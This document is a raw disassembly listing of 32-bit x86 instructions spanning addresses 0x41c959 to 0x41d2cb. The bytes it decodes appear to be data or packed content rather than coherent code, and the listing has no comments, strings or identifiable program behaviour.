  41c959:	xchg   esi,eax
  41c95a:	mov    al,ds:0xaa5c615c
  41c95f:	cdq    
  41c960:	jnp    0x41c9aa
  41c962:	shl    BYTE PTR [esi-0x684abe26],cl
  41c968:	out    dx,eax
  41c969:	adc    DWORD PTR [esi],esi
  41c96b:	cs loope 0x41c9a1
  41c96e:	out    0xcc,eax
  41c970:	push   ebx
  41c971:	pop    eax
  41c972:	add    BYTE PTR [edi-0x43],bh
  41c975:	icebp  
  41c976:	aas    
  41c977:	mov    cl,0xcb
  41c979:	mov    dh,0xd9
  41c97b:	nop
  41c97c:	mov    bl,0x4f
  41c97e:	jb     0x41c9b0
  41c980:	cwde   
  41c981:	sbb    esp,DWORD PTR fs:[eax+edi*4-0x5e696d78]
  41c989:	popa   
  41c98a:	jb     0x41c9e8
  41c98c:	sub    ebx,DWORD PTR [eax+edi*2-0x5c]
  41c990:	mov    dl,0x70
  41c992:	ja     0x41c9f6
  41c994:	mov    DWORD PTR [ebx+edx*4],esi
  41c997:	psubd  mm5,mm2
  41c99a:	dec    esp
  41c99b:	repz dec esp
  41c99d:	pop    ecx
  41c99e:	aaa    
  41c99f:	inc    edi
  41c9a0:	call   0x9931a6d5
  41c9a5:	mov    ch,0x85
  41c9a7:	jge    0x41ca23
  41c9a9:	and    eax,0x7344ca84
  41c9ae:	and    dh,BYTE PTR [eax-0x4b]
  41c9b1:	pop    esp
  41c9b2:	sbb    al,0x2
  41c9b4:	add    eax,edi
  41c9b6:	out    dx,eax
  41c9b7:	adc    eax,0x2efebec6
  41c9bc:	jbe    0x41c972
  41c9be:	cmp    DWORD PTR [ebx-0x1593b0a7],ebx
  41c9c4:	jmp    0xfd28:0xc910eb8e
  41c9cb:	adc    al,0x90
  41c9cd:	in     eax,dx
  41c9ce:	add    BYTE PTR [edi-0x4d1e2dce],bl
  41c9d4:	mov    ch,0xb5
  41c9d6:	jae    0x41c9a7
  41c9d8:	mov    bl,0x5
  41c9da:	cmp    eax,0xeb0b9ec
  41c9df:	xchg   esp,eax
  41c9e0:	add    al,0x4a
  41c9e2:	imul   esi,DWORD PTR [ebx],0x6316ebf8
  41c9e8:	pop    edi
  41c9e9:	add    BYTE PTR [ebp-0x67],dh
  41c9ec:	jmp    0x6b29:0xd7a9cc53
  41c9f3:	push   ss
  41c9f4:	push   cs
  41c9f5:	add    eax,edi
  41c9f7:	mov    ds:0x7a0c8b0d,al
  41c9fc:	dec    ecx
  41c9fd:	push   ds
  41c9fe:	clc    
  41c9ff:	es sbb esi,ecx
  41ca02:	push   edx
  41ca03:	push   edi
  41ca04:	push   ss
  41ca05:	dec    esp
  41ca06:	je     0x41ca06
  41ca08:	fnsave [ecx-0x55]
  41ca0b:	and    DWORD PTR [ebp+ebp*1+0x3f],ebp
  41ca0f:	mov    eax,ds:0x37
	...
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	mov    eax,0xad75d370
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR ds:0x9e000001,al
  41ca8d:	scas   al,BYTE PTR es:[edi]
  41ca8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca8f:	or     DWORD PTR [edi-0x6c],eax
  41ca92:	test   DWORD PTR es:[esi],ecx
  41ca95:	xlat   BYTE PTR ds:[ebx]
  41ca96:	jmp    0x41ca78
  41ca98:	outs   dx,BYTE PTR ds:[esi]
  41ca99:	xchg   esi,eax
  41ca9a:	arpl   WORD PTR [edi+0x4a],di
  41ca9d:	out    dx,al
  41ca9e:	pop    eax
  41ca9f:	imul   ecx,DWORD PTR [esi+0x45d69521],0xffffffdd
  41caa6:	cld    
  41caa7:	push   edx
  41caa8:	and    BYTE PTR [ecx],bl
  41caaa:	je     0x41ca63
  41caac:	push   ecx
  41caad:	cmc    
  41caae:	(bad)  
  41caaf:	cdq    
  41cab0:	out    dx,eax
  41cab1:	inc    edx
  41cab2:	xlat   BYTE PTR ds:[ebx]
  41cab3:	stc    
  41cab4:	in     eax,dx
  41cab5:	pop    esp
  41cab6:	sbb    al,BYTE PTR [edi]
  41cab8:	shr    ebx,0x85
  41cabb:	xor    al,0xb3
  41cabd:	es mov bh,0xed
  41cac0:	ins    BYTE PTR es:[edi],dx
  41cac1:	mov    ah,0xe2
  41cac3:	sbb    BYTE PTR [ebp+ecx*1-0x56],dh
  41cac7:	sub    DWORD PTR [ecx+0x58],esp
  41caca:	jg     0x41ca67
  41cacc:	sbb    eax,0x908c83bd
  41cad1:	inc    edi
  41cad2:	and    ch,BYTE PTR [edi+ebp*8+0x39]
  41cad6:	fisub  WORD PTR [edi+eiz*4+0x30]
  41cada:	lahf   
  41cadb:	ds sub bh,cl
  41cade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cadf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cae0:	cdq    
  41cae1:	aaa    
  41cae2:	xchg   BYTE PTR [esi-0x56],dh
  41cae5:	xchg   esp,eax
  41cae6:	in     eax,dx
  41cae7:	sub    BYTE PTR [edi],ah
  41cae9:	les    eax,FWORD PTR [edx+0x7db16828]
  41caef:	daa    
  41caf0:	mul    BYTE PTR [edi+0x6e]
  41caf3:	ja     0x41cb14
  41caf5:	jbe    0x41caf7
  41caf7:	mul    BYTE PTR [ecx+0x564f7f93]
  41cafd:	mov    ds:0xae6573d5,al
  41cb02:	mov    cl,0xb6
  41cb04:	mov    BYTE PTR ds:0xde7c90cc,dh
  41cb0a:	cmp    al,0x33
  41cb0c:	loop   0x41cb41
  41cb0e:	xchg   ebx,eax
  41cb0f:	lds    edi,FWORD PTR [esp+edx*8-0x5d388c1]
  41cb16:	pop    edx
  41cb17:	sbb    cl,BYTE PTR ds:0xdf52660d
  41cb1d:	mov    ch,0xda
  41cb1f:	and    DWORD PTR [ecx+0x8],ecx
  41cb22:	mov    ecx,0x6c4cf822
  41cb27:	inc    esp
  41cb28:	mov    BYTE PTR [ecx],al
  41cb2a:	repz into 
  41cb2c:	jo     0x41cba2
  41cb2e:	cmp    ebx,DWORD PTR [esp+ecx*4-0x348a50c0]
  41cb35:	cmp    edx,edx
  41cb37:	sahf   
  41cb38:	pushf  
  41cb39:	or     al,0xbf
  41cb3b:	sub    al,0x35
  41cb3d:	js     0x41cb15
  41cb3f:	mov    eax,0x4b2e0bad
  41cb44:	adc    bh,ah
  41cb46:	out    0x81,eax
  41cb48:	add    BYTE PTR [ebp-0x44cecbc3],al
  41cb4e:	(bad)
  41cb51:	outs   dx,BYTE PTR ds:[esi]
  41cb52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb53:	cmc    
  41cb54:	popa   
  41cb55:	and    esi,DWORD PTR [edx-0x3f]
  41cb58:	xchg   ebx,eax
  41cb59:	xor    dl,BYTE PTR [ecx]
  41cb5b:	ja     0x41cb17
  41cb5d:	pusha  
  41cb5e:	shr    DWORD PTR [esi-0x17],0x8c
  41cb62:	in     al,0xc3
  41cb64:	loop   0x41cb24
  41cb66:	mov    ds:0x47d844db,al
  41cb6b:	mov    ?,WORD PTR [ebx]
  41cb6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb6e:	das    
  41cb6f:	call   0x845a:0xfdea78a
  41cb76:	imul   edi,eax,0x9efb68ee
  41cb7c:	loopne 0x41cbaf
  41cb7e:	or     edi,esp
  41cb80:	mov    edi,0xa05d4fe9
  41cb85:	aas    
  41cb86:	pop    ebx
  41cb87:	mov    ecx,0x2208ac61
  41cb8c:	ins    BYTE PTR es:[edi],dx
  41cb8d:	in     eax,0xcc
  41cb8f:	imul   esp,ebp,0x0
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x5c118a22
  41cc03:	in     al,0xb2
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR ds:0xc4000001,al
  41cc0d:	rcl    ebx,1
  41cc0f:	in     eax,dx
  41cc10:	adc    ecx,ebx
  41cc12:	sbb    BYTE PTR [edi-0x10],0x5f
  41cc16:	cdq    
  41cc17:	popf   
  41cc18:	ror    esp,0xdb
  41cc1b:	mov    bl,0xf2
  41cc1d:	rcl    eax,0xf6
  41cc20:	mov    BYTE PTR es:[eax+0x3f],cl
  41cc24:	stos   DWORD PTR es:[edi],eax
  41cc25:	adc    al,al
  41cc27:	push   eax
  41cc28:	pushf  
  41cc29:	aaa    
  41cc2a:	push   0xe9579b25
  41cc2f:	and    al,0x2b
  41cc32:	add    DWORD PTR ds:[esi-0x7d],ecx
  41cc36:	sar    BYTE PTR [edi],1
  41cc38:	push   0x14
  41cc3a:	in     eax,dx
  41cc3b:	leave  
  41cc3c:	jbe    0x41cbe6
  41cc3e:	int    0xbb
  41cc40:	popa   
  41cc41:	mov    BYTE PTR [esi],dl
  41cc43:	outs   dx,DWORD PTR ds:[esi]
  41cc44:	jle    0x41ccb9
  41cc46:	push   ecx
  41cc47:	enter  0x9770,0x3
  41cc4b:	and    DWORD PTR [eax+0x50],ecx
  41cc4e:	sbb    dh,ch
  41cc50:	cli    
  41cc51:	mov    esp,0xd38faba8
  41cc56:	loope  0x41cc4a
  41cc58:	outs   dx,BYTE PTR ds:[esi]
  41cc59:	xchg   edi,eax
  41cc5a:	or     edi,DWORD PTR [esi]
  41cc5c:	enter  0x6ebb,0x9e
  41cc60:	in     eax,dx
  41cc61:	ss ret 
  41cc63:	mov    edi,0xd3fc2ef7
  41cc68:	imul   esp,DWORD PTR [esi*4+0x52013ac],0x5f2cbf41
  41cc73:	scas   eax,DWORD PTR es:[edi]
  41cc74:	mov    eax,ds:0x36d8aab1
  41cc79:	stos   BYTE PTR es:[edi],al
  41cc7a:	adc    al,BYTE PTR [ecx+esi*2+0x3]
  41cc7e:	cld    
  41cc7f:	push   eax
  41cc80:	fs xchg ebx,eax
  41cc82:	stc    
  41cc83:	adc    al,0x95
  41cc85:	addr16 mov dh,0x0
  41cc88:	out    0xea,al
  41cc8a:	popf   
  41cc8b:	jmp    0x41ccd6
  41cc8d:	adc    dl,BYTE PTR [edi]
  41cc8f:	add    eax,0x35bca05b
  41cc94:	mov    BYTE PTR [eax],0x31
  41cc97:	xchg   esi,eax
  41cc98:	fcomp  QWORD PTR [edx-0x8105f9]
  41cc9e:	dec    esi
  41cc9f:	inc    ebp
  41cca0:	popf   
  41cca1:	shr    BYTE PTR cs:[esi-0x1],cl
  41cca5:	xor    ah,al
  41cca7:	pushf  
  41cca8:	ja     0x41cc4d
  41ccaa:	dec    ebx
  41ccab:	adc    dl,al
  41ccad:	mov    eax,0x2ae02231
  41ccb2:	push   0xfffffff8
  41ccb4:	push   esp
  41ccb5:	or     esi,DWORD PTR [eax-0x4eec98c5]
  41ccbb:	in     eax,0x7e
  41ccbd:	xchg   ebx,eax
  41ccbe:	xchg   edx,eax
  41ccbf:	jg     0x41cc52
  41ccc1:	pop    ss
  41ccc2:	ins    DWORD PTR es:[edi],dx
  41ccc3:	sahf   
  41ccc4:	cli    
  41ccc5:	pop    edi
  41ccc6:	mov    bh,ch
  41ccc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccc9:	pop    ss
  41ccca:	push   esp
  41cccb:	loop   0x41cd05
  41cccd:	cli    
  41ccce:	leave  
  41cccf:	inc    edi
  41ccd0:	test   al,0x82
  41ccd2:	jno    0x41cd00
  41ccd4:	add    BYTE PTR [esi-0x3d],ch
  41ccd7:	in     al,0xb4
  41ccd9:	mov    ds:0x3c0fc583,eax
  41ccde:	sub    ebx,eax
  41cce0:	mov    dl,0x9
  41cce2:	out    dx,eax
  41cce3:	xchg   esp,eax
  41cce4:	pop    esi
  41cce5:	call   0x45c92aec
  41ccea:	push   0xe29d8a91
  41ccef:	jl     0x41cca8
  41ccf1:	sub    BYTE PTR [ebp+0x2c],dh
  41ccf4:	fistp  WORD PTR [edi+0x3b]
  41ccf7:	jl     0x41cc7c
  41ccf9:	sub    BYTE PTR [edi+ebp*2+0x1a],bh
  41ccfd:	scas   eax,DWORD PTR es:[edi]
  41ccfe:	sti    
  41ccff:	push   esi
  41cd00:	je     0x41cd60
  41cd02:	xor    al,0x2b
  41cd04:	inc    ebp
  41cd05:	mov    al,0x42
  41cd07:	je     0x41cd7c
  41cd09:	aad    0x14
  41cd0b:	jne    0x41cceb
  41cd0d:	cmp    BYTE PTR [eax],bl
  41cd0f:	sbb    al,0x60
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	mov    es:0x32b73d0c,eax
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    eax,0x86000001
  41cd8d:	gs jo  0x41cd3d
  41cd90:	sbb    DWORD PTR [eax+ecx*1-0x60cd546f],edx
  41cd97:	cld    
  41cd98:	jge    0x41cd8d
  41cd9a:	sub    BYTE PTR [ebp+0x53],bl
  41cd9d:	jmp    FWORD PTR [edx+0x2ed1e3a8]
  41cda3:	scas   eax,DWORD PTR es:[edi]
  41cda4:	pop    esp
  41cda5:	sbb    eax,0x173781a
  41cdaa:	jns    0x41cd33
  41cdac:	mov    ch,0x8b
  41cdae:	(bad)  
  41cdaf:	and    esi,eax
  41cdb1:	daa    
  41cdb2:	xor    eax,0xede9aab5
  41cdb7:	cmp    BYTE PTR [edi-0x39],ch
  41cdba:	fistp  DWORD PTR [ebp+0x16e8878e]
  41cdc0:	adc    ah,BYTE PTR [eax-0x32d09741]
  41cdc6:	or     eax,0x9ebfd564
  41cdcb:	test   ch,cl
  41cdcd:	inc    esi
  41cdce:	bound  esi,QWORD PTR [edx]
  41cdd0:	mov    dl,0x3f
  41cdd2:	dec    edx
  41cdd3:	(bad)  
  41cdd4:	cmp    DWORD PTR [ebp-0x657b4f99],eax
  41cdda:	stc    
  41cddb:	ins    BYTE PTR es:[edi],dx
  41cddc:	rcl    ch,cl
  41cdde:	rcl    DWORD PTR [eax],0xbc
  41cde1:	aad    0x84
  41cde3:	cmp    eax,0xfbe9b7b
  41cde8:	pop    es
  41cde9:	sub    eax,0xd3e99966
  41cdee:	sub    DWORD PTR [edx+edi*1-0x191ac627],ebp
  41cdf5:	rol    bl,0x66
  41cdf8:	push   esp
  41cdf9:	adc    DWORD PTR [ebp+0x57],0xe
  41cdfd:	int    0x78
  41cdff:	inc    ebx
  41ce00:	pop    ecx
  41ce01:	mov    edx,gs
  41ce03:	push   ecx
  41ce04:	jb     0x41ce73
  41ce06:	dec    eax
  41ce07:	cdq    
  41ce08:	pop    ebp
  41ce09:	js     0x41ce22
  41ce0b:	inc    esi
  41ce0c:	ja     0x41ce63
  41ce0e:	xchg   cl,bh
  41ce10:	mov    cl,0x99
  41ce12:	or     BYTE PTR [esp+0x57f72782],bh
  41ce19:	fmul   DWORD PTR [ebp+0x3df0b1c1]
  41ce1f:	out    0xd2,eax
  41ce21:	clc    
  41ce22:	scas   al,BYTE PTR es:[edi]
  41ce23:	rcr    DWORD PTR [esi],0xc0
  41ce26:	xchg   ebx,eax
  41ce27:	jmp    0x41cdfb
  41ce29:	imul   eax,edi,0x30
  41ce2c:	add    dh,ch
  41ce2e:	mov    ah,0x34
  41ce30:	mov    al,ds:0x38559807
  41ce35:	sbb    bl,bh
  41ce37:	ins    DWORD PTR es:[edi],dx
  41ce38:	jg     0x41cea3
  41ce3a:	cmp    BYTE PTR [edi],ch
  41ce3c:	cld    
  41ce3d:	xor    DWORD PTR [eax-0x1b],edi
  41ce40:	scas   al,BYTE PTR es:[edi]
  41ce41:	mov    ds:0x390f5aea,eax
  41ce46:	jle    0x41ceb3
  41ce48:	cmp    dh,bh
  41ce4a:	and    eax,esp
  41ce4c:	fnstsw WORD PTR [eax+edx*2]
  41ce4f:	sbb    al,cl
  41ce51:	(bad)  
  41ce52:	imul   esi,DWORD PTR [edi+ecx*1+0x79],0x9d44da27
  41ce5a:	jp     0x41ce25
  41ce5c:	mov    cl,BYTE PTR [edi+ecx*2-0x71d911a]
  41ce63:	data16 mov dl,0xe1
  41ce66:	repz xlat BYTE PTR ds:[ebx]
  41ce68:	dec    ebp
  41ce69:	dec    ebx
  41ce6a:	and    DWORD PTR [edi-0x5db3b2ab],edi
  41ce70:	mov    DWORD PTR [esi+edi*4],eax
  41ce73:	mov    al,0x43
  41ce75:	or     edx,DWORD PTR [esi+ecx*8]
  41ce78:	and    ebx,esi
  41ce7a:	cmp    al,0x88
  41ce7c:	je     0x41cea1
  41ce7e:	je     0x41ce75
  41ce80:	into   
  41ce81:	mov    ah,0x12
  41ce83:	bound  ebx,QWORD PTR [esi]
  41ce85:	dec    ecx
  41ce86:	scas   al,BYTE PTR es:[edi]
  41ce87:	jbe    0x41ce24
  41ce89:	jmp    0x2ca3:0x7a959076
  41ce90:	jns    0x41ce92
	...
  41cef2:	add    BYTE PTR [eax],al
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	sbb    BYTE PTR [edx+0x33bca6ab],dh
  41cf06:	add    DWORD PTR [eax],eax
  41cf08:	add    eax,0x26000001
  41cf0d:	std    
  41cf0e:	js     0x41ceec
  41cf10:	cwde   
  41cf11:	sub    DWORD PTR [eax+0x69a840e2],edx
  41cf17:	mov    eax,0x6d8a2dd4
  41cf1c:	jae    0x41cf38
  41cf1e:	dec    esi
  41cf1f:	push   ebx
  41cf20:	push   ecx
  41cf21:	arpl   WORD PTR [ecx+0x6c2f2c50],bx
  41cf27:	push   cs
  41cf28:	xor    cl,ah
  41cf2a:	mov    al,ds:0x8bee62bf
  41cf2f:	hlt    
  41cf30:	idiv   DWORD PTR [ebx+0x2e]
  41cf33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf34:	inc    ecx
  41cf35:	adc    dh,dh
  41cf37:	xor    edi,edi
  41cf39:	aam    0xd
  41cf3b:	imul   eax,DWORD PTR [ecx],0x22a5736e
  41cf41:	or     bh,BYTE PTR [ebx+eax*2+0x24]
  41cf45:	and    eax,0x8f73ffae
  41cf4a:	fmulp  st(1),st
  41cf4c:	xor    BYTE PTR [ebp-0x1df00efe],dl
  41cf52:	jno    0x41cf88
  41cf54:	das    
  41cf55:	rol    dh,cl
  41cf57:	popf   
  41cf58:	es xor eax,0x30434a7a
  41cf5e:	(bad)  
  41cf5f:	jo     0x41cf96
  41cf61:	or     BYTE PTR fs:[esi-0x6198fa62],bl
  41cf68:	xlat   BYTE PTR ds:[ebx]
  41cf69:	pop    ds
  41cf6a:	paddsb mm0,mm7
  41cf6d:	iret   
  41cf6e:	mov    al,0x4d
  41cf70:	mov    eax,ds:0x729e07a0
  41cf75:	sti    
  41cf76:	stc    
  41cf77:	fdiv   DWORD PTR [edx]
  41cf79:	bts    edx,edi
  41cf7c:	iret   
  41cf7d:	xchg   esp,eax
  41cf7e:	mov    ebp,0x621b8f86
  41cf83:	jle    0x41cfce
  41cf85:	and    eax,DWORD PTR fs:[esp+ebp*1]
  41cf89:	out    dx,eax
  41cf8a:	cli    
  41cf8b:	pushf  
  41cf8c:	xchg   ebx,eax
  41cf8d:	das    
  41cf8e:	jb     0x41cf2c
  41cf90:	in     eax,dx
  41cf91:	imul   ebp,edx,0xffffffc4
  41cf94:	mov    bl,0x5c
  41cf96:	mov    ch,0xcb
  41cf98:	sbb    BYTE PTR [edx-0x37eb3ebe],bl
  41cf9e:	mov    eax,ds:0x526ac4fa
  41cfa3:	or     eax,0xb2bc6971
  41cfa8:	arpl   WORD PTR [esi+0x37cc4925],dx
  41cfae:	jno    0x41d02c
  41cfb0:	pop    edx
  41cfb1:	mov    esi,0xd18916a7
  41cfb6:	dec    edi
  41cfb7:	out    0x79,al
  41cfb9:	jecxz  0x41d014
  41cfbb:	int    0x91
  41cfbd:	inc    ebp
  41cfbe:	call   0xc5a349a9
  41cfc3:	stos   BYTE PTR es:[edi],al
  41cfc4:	push   ebx
  41cfc5:	and    DWORD PTR [ecx-0x7bc8fb4e],edx
  41cfcb:	into   
  41cfcc:	inc    ecx
  41cfcd:	(bad)  
  41cfce:	mov    dl,0x88
  41cfd0:	div    edi
  41cfd2:	(bad)
  41cfd5:	test   eax,0xec33f354
  41cfda:	fwait
  41cfdb:	dec    ebx
  41cfdc:	std    
  41cfdd:	daa    
  41cfde:	xor    eax,0x2adbaada
  41cfe3:	dec    edx
  41cfe4:	jecxz  0x41cfc3
  41cfe6:	lods   eax,DWORD PTR ds:[esi]
  41cfe7:	ret    0xc65d
  41cfea:	fnstsw WORD PTR [ecx-0x71deceb4]
  41cff0:	push   ecx
  41cff1:	pop    edi
  41cff2:	push   esp
  41cff3:	dec    edi
  41cff4:	mov    edi,0xd1bef7f2
  41cff9:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cffb:	jbe    0x41d010
  41cffd:	or     eax,0x1774b2f9
  41d002:	out    dx,eax
  41d003:	push   cs
  41d004:	mov    edi,0x6149a249
  41d009:	(bad)  
  41d00a:	std    
  41d00b:	fs sub eax,0xf71a1e26
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xaf560dbd
  41d083:	hlt    
  41d084:	shl    DWORD PTR [ecx+eax*1],0x0
  41d088:	add    eax,0x9e000001
  41d08d:	cs mov eax,0x26569f4b
  41d093:	fdivr  QWORD PTR [ebx+eax*2+0x2ecd9a19]
  41d09a:	add    eax,0x3af11bfc
  41d09f:	mov    DWORD PTR [edx-0x12913ff9],eax
  41d0a5:	inc    edi
  41d0a6:	inc    edi
  41d0a7:	dec    esp
  41d0a8:	jl     0x41d0e2
  41d0aa:	aaa    
  41d0ab:	jnp    0x41d06e
  41d0ad:	fild   QWORD PTR [edx-0x42]
  41d0b0:	cmp    DWORD PTR [ebp-0x30d50711],esi
  41d0b6:	fnstenv [ebp-0x7f803065]
  41d0bc:	and    eax,DWORD PTR [edi-0x65]
  41d0bf:	retf   
  41d0c0:	addr16 and eax,0xb76ee925
  41d0c6:	xlat   BYTE PTR ds:[ebx]
  41d0c7:	(bad)  
  41d0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0c9:	sbb    BYTE PTR fs:[edi+0x68],al
  41d0cd:	gs push ebx
  41d0cf:	repnz (bad) cs:[edi-0x2b]
  41d0d4:	jne    0x41d152
  41d0d6:	cdq    
  41d0d7:	mov    DWORD PTR [ebx],ebp
  41d0d9:	int    0x7e
  41d0db:	lods   eax,DWORD PTR ds:[esi]
  41d0dc:	sub    esp,eax
  41d0de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0df:	ja     0x41d10c
  41d0e1:	cmp    ah,BYTE PTR [esi-0x6a]
  41d0e4:	out    0x33,al
  41d0e6:	add    eax,0x2a0afad3
  41d0eb:	and    eax,0xc4ba7c50
  41d0f0:	jmp    0x41d0cf
  41d0f2:	or     esp,edx
  41d0f4:	pop    edi
  41d0f5:	pop    edi
  41d0f6:	rol    BYTE PTR [edx+0x71],0x6f
  41d0fa:	ret    0xfbfd
  41d0fd:	lock (bad) [ebx]
  41d100:	pop    ecx
  41d101:	push   esp
  41d102:	popa   
  41d103:	leave  
  41d104:	and    al,0x1d
  41d106:	test   BYTE PTR [ecx+esi*1-0x60],bh
  41d10a:	data16 std 
  41d10c:	loop   0x41d101
  41d10e:	push   esp
  41d10f:	cdq    
  41d110:	mov    al,BYTE PTR [eax]
  41d112:	lock inc ebp
  41d114:	cdq    
  41d115:	(bad)
  41d118:	sahf   
  41d119:	bound  ebx,QWORD PTR [ecx-0x69]
  41d11c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d11d:	scas   al,BYTE PTR es:[edi]
  41d11e:	mov    ah,0x81
  41d121:	mov    esi,0x173681b8
  41d126:	jno    0x41d149
  41d128:	sub    BYTE PTR [ebp-0x23f89ba2],ch
  41d12e:	inc    edi
  41d12f:	push   edx
  41d130:	cmp    ecx,DWORD PTR [ebx]
  41d132:	mov    esp,0x3f60b362
  41d137:	outs   dx,BYTE PTR ds:[esi]
  41d138:	jnp    0x41d133
  41d13a:	adc    DWORD PTR [edi+0xe],ebp
  41d13d:	(bad)  
  41d13e:	retf   
  41d13f:	out    dx,eax
  41d140:	je     0x41d0f6
  41d142:	test   eax,0xc67e8459
  41d147:	stos   BYTE PTR es:[edi],al
  41d148:	loopne 0x41d1c9
  41d14a:	adc    eax,0x8126a57c
  41d14f:	mov    eax,0x20f0fe8e
  41d154:	gs dec esi
  41d156:	dec    ebx
  41d157:	test   al,0x23
  41d159:	or     al,BYTE PTR [edx-0xeaaaf64]
  41d15f:	mov    eax,ds:0x60ecf6fb
  41d164:	das    
  41d165:	mov    ebx,0xb3d83842
  41d16a:	leave  
  41d16b:	xor    DWORD PTR [edx-0x1e],ebx
  41d16e:	push   edi
  41d16f:	inc    eax
  41d170:	cmp    al,0x51
  41d172:	cld    
  41d173:	scas   al,BYTE PTR es:[edi]
  41d174:	push   esp
  41d175:	jnp    0x41d13c
  41d177:	int3   
  41d178:	pop    edi
  41d179:	pop    edx
  41d17a:	xchg   esp,eax
  41d17b:	add    cl,bl
  41d17d:	cdq    
  41d17e:	aaa    
  41d17f:	gs jmp 0xa4ff:0xe870ee48
  41d187:	leave  
  41d188:	push   ds
  41d189:	mov    al,ds:0xffacfc7f
  41d18e:	xor    DWORD PTR [edi+0x3e],esp
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	iret   
  41d201:	das    
  41d202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d203:	je     0x41d1cb
  41d205:	xor    eax,0x1050001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	sti    
  41d20d:	pop    ebx
  41d20e:	pop    ebx
  41d20f:	fisttp WORD PTR cs:[ebp-0x111c3e01]
  41d216:	xchg   esp,eax
  41d217:	(bad)  
  41d218:	pop    ecx
  41d219:	ins    BYTE PTR es:[edi],dx
  41d21a:	mov    ebx,0x5ad0e72c
  41d21f:	icebp  
  41d220:	dec    edi
  41d221:	daa    
  41d222:	(bad)  
  41d223:	jge    0x41d24c
  41d225:	lea    eax,[edi]
  41d227:	mov    ebx,0x463a0e15
  41d22c:	stos   DWORD PTR es:[edi],eax
  41d22d:	add    al,0x5f
  41d22f:	cwde   
  41d230:	lea    eax,[esi-0x1ff9a7c4]
  41d236:	jmp    0x41d266
  41d238:	xor    DWORD PTR [ebx+0x3],edx
  41d23b:	cs pop edx
  41d23d:	popa   
  41d23e:	leave  
  41d23f:	aaa    
  41d240:	inc    edx
  41d241:	xchg   esp,eax
  41d242:	xchg   DWORD PTR [ecx],edi
  41d244:	mov    ds:0x63e1bfa0,eax
  41d249:	repnz or cl,BYTE PTR [ecx]
  41d24c:	daa    
  41d24d:	pop    ss
  41d24e:	std    
  41d24f:	int3   
  41d250:	(bad)  
  41d252:	mov    bl,0xd6
  41d254:	fild   WORD PTR [esi-0x66]
  41d257:	and    cl,BYTE PTR [esi+0x6e]
  41d25a:	xor    esi,DWORD PTR [ebp-0x5c]
  41d25d:	iret   
  41d25e:	enter  0x6527,0xe7
  41d262:	push   0xffffffb6
  41d264:	pusha  
  41d265:	jbe    0x41d28e
  41d267:	mov    ch,0x8e
  41d269:	bnd jns 0x41d257
  41d26c:	xchg   ecx,eax
  41d26d:	cmp    eax,0x269b1fc8
  41d272:	xor    eax,0xd10d57a9
  41d277:	push   esi
  41d278:	jne    0x41d29e
  41d27a:	inc    edx
  41d27b:	xchg   ecx,eax
  41d27c:	ret    0xc488
  41d27f:	mov    ebp,0x5a3600a
  41d284:	sti    
  41d285:	repz sub BYTE PTR [eax+0x630a7ee2],bh
  41d28c:	or     al,0xd2
  41d28e:	out    0xce,al
  41d290:	es push edx
  41d292:	jns    0x41d23d
  41d294:	or     eax,0x986b6a51
  41d299:	lods   al,BYTE PTR ds:[esi]
  41d29a:	jne    0x41d254
  41d29c:	sub    edx,DWORD PTR [edx+eiz*4+0x22]
  41d2a0:	cs scas al,BYTE PTR es:[edi]
  41d2a2:	push   ds
  41d2a3:	push   es
  41d2a4:	gs test al,0x63
  41d2a7:	lds    eax,FWORD PTR [edi+0xa]
  41d2aa:	pop    ecx
  41d2ab:	cmp    DWORD PTR [eax+ebp*2-0xc],ebx
  41d2af:	sub    eax,0xff1aaac5
  41d2b4:	pushf  
  41d2b5:	jle    0x41d2d8
  41d2b7:	arpl   WORD PTR [ebx+eax*2+0x2d53649],ax
  41d2be:	(bad)  
  41d2bf:	stc    
  41d2c0:	mov    dh,0xa1
  41d2c2:	ins    DWORD PTR es:[edi],dx
  41d2c3:	fsubr  QWORD PTR [ebp-0x7d55c4d3]
  41d2c9:	mov    cl,0xa5
  41d2cb:	outs   dx,DWORD PTR ds:[esi]
